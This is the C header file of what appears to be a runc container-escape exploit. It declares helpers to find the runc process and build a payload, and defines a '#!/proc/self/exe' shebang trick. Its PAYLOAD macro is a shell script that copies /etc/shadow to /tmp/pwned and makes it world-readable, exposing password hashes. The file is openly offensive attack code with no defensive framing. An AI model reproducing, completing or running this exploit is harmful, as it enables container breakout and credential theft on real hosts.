#ifndef EXPLOIT_H
#define EXPLOIT_H

#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <dirent.h>
#include <limits.h>
#include <sys/stat.h>
#include <ctype.h>

#define SHELL_PATH "/bin/sh"
#define SHEBANG "#!/proc/self/exe\n"
#define PAYLOAD_HEADER "#!/bin/sh\n"
#define PAYLOAD "#!/bin/sh\ncp /etc/shadow /tmp/pwned && chmod 644 /tmp/pwned\n"

#define MAX_PAYLOAD 512

extern char payload[MAX_PAYLOAD];
extern int debug_mode; 


typedef struct {
    int pid;
    char exe_path[PATH_MAX];
} runc_info_t;

int parse_args(int argc, char* argv[], char** out_cmd, int* out_len);
size_t setup_payload(char* cmd, int cmd_size);
runc_info_t find_runc_info();
int is_pid_dir(const char *name);

#endif
